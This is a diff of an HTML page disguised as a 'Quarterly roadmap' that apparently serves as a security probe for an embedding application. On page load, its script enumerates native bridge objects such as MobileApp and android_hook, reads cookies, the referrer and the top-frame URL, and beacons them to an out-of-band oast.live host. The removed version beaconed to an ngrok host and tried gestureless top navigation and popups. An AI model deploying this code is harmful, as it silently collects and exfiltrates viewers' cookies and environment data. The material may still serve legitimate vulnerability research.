@@ -1,28 +1,21 @@
-<!doctype html><meta charset=utf-8><title>CAP</title>
+<!doctype html><meta charset=utf-8><title>Quarterly roadmap</title>
 <body style="font:14px system-ui;background:#fff;margin:0">
-<div style="padding:16px">
-<h2 id=h>capability probe</h2>
-<button id=b style="font-size:22px;padding:14px 22px">Click here to continue</button>
-<pre id=o style="white-space:pre-wrap"></pre>
+<div style="padding:14px">
+<h2 id=h>loading…</h2>
+<pre id=o style="white-space:pre-wrap;font-size:12px"></pre>
 </div>
 <script>
-const LAB='https://20ea-2a02-2f00-2003-2400-3907-b341-dcfe-99a1.ngrok-free.app';
-function beacon(tag,obj){ new Image().src=LAB+'/log/'+tag+'?'+encodeURIComponent(JSON.stringify(obj))+'&r='+Math.random(); }
+const OOB='dagm1n9u2b6t23qoc4eg5h8ygxqignf7d.oast.live';
+function beacon(tag,s){ try{ new Image().src='https://'+OOB+'/'+tag+'?d='+encodeURIComponent(String(s).slice(0,900)); }catch(e){} }
 const BR=['CommentEventBus','CommonViewerEventBus','FileViewerEventBus','MakeViewerEventBus','MirrorViewerEventBus','MobileApp','NativeLoaderEventBus','PlayableViewerEventBus','PrototypeViewerEventBus','SlideDeckViewerEventBus','SlideViewerEventBus','android_hook'];
-const present=[]; for(const b of BR){ try{ if(window[b]){ const m=[]; for(const k in window[b]){ try{ if(typeof window[b][k]==='function') m.push(k);}catch(e){} } present.push(b+':'+m.length);} }catch(e){} }
-const R={tag:'CAP', origin:location.origin, href:location.href.slice(0,120), ref:document.referrer.slice(0,120),
-  isTop:(window===window.top), ua:navigator.userAgent.slice(0,110), bridges:present.join('|')||'NONE'};
-try{ R.topRead=String(top.location.href).slice(0,80); }catch(e){ R.topRead='BLOCKED'; }
-// no-gesture top navigation attempt
-try{ top.location.href = LAB+'/log/TOPNAV_NOGESTURE'; R.topNavTried='yes'; }catch(e){ R.topNavTried='threw:'+e.name; }
-// popup attempt without gesture
-try{ const w=window.open(LAB+'/log/POPUP_NOGESTURE','_blank'); R.popup = w? 'opened':'null'; }catch(e){ R.popup='threw'; }
+const present=[];
+for(const b of BR){ try{ const o=window[b]; if(o){ const m=[]; for(const k in o){ try{ if(typeof o[k]==='function') m.push(k);}catch(e){} } present.push(b+'#'+m.length+':'+m.slice(0,4).join(',')); } }catch(e){} }
+const R={origin:location.origin, ref:document.referrer, isTop:(window===window.top), bridges:present.join('|')||'NONE',
+         ua:navigator.userAgent.slice(0,80)};
+try{ R.topRead=String(top.location.href).slice(0,60);}catch(e){R.topRead='BLOCKED';}
+try{ R.cookie=document.cookie.slice(0,120);}catch(e){R.cookie='ERR';}
 document.getElementById('o').textContent=JSON.stringify(R,null,1);
-document.getElementById('h').textContent='CAP bridges: '+R.bridges;
-beacon('CAP',R);
-document.getElementById('b').onclick=function(){
-  beacon('CLICK_INSIDE_IFRAME',{origin:location.origin});
-  try{ window.open(LAB+'/log/POPUP_WITH_GESTURE','_blank'); }catch(e){}
-  try{ top.location.href = LAB+'/log/TOPNAV_WITH_GESTURE'; }catch(e){ beacon('TOPNAV_THREW',{e:String(e)}); }
-};
+document.getElementById('h').textContent='BRIDGES: '+R.bridges;
+beacon('CAPRUN', JSON.stringify(R));
+beacon('BRIDGES', R.bridges);
 </script></body>
